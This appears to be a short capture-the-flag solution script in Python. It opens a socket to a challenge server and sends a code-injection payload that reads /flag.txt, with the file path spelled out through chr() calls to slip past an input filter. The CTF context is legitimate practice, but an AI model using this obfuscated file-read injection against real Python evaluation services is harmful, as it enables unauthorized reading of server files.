import socket

# Define the host and port of the server you want to connect to
HOST = 'chal.sigpwny.com'
PORT = 7002

# Connect to the server
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
	s.connect((HOST, PORT))
    
	# Receive feedback from the server
	data = s.recv(1024)
	feedback = data.decode()
	print("Feedback from server: ", feedback)

	# Run your Python code and save the output to a variable
	#payload = b"print(open('/flag.txt').read())"
	payload = b"open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()"
    
	# Send the output to the server
	s.sendall(payload)
	
	ret = "\n"
	
	s.sendall(ret.encode())

	# Receive feedback from the server
	data = s.recv(1024)
	feedback = data.decode()
	print("Feedback from server: ", feedback)

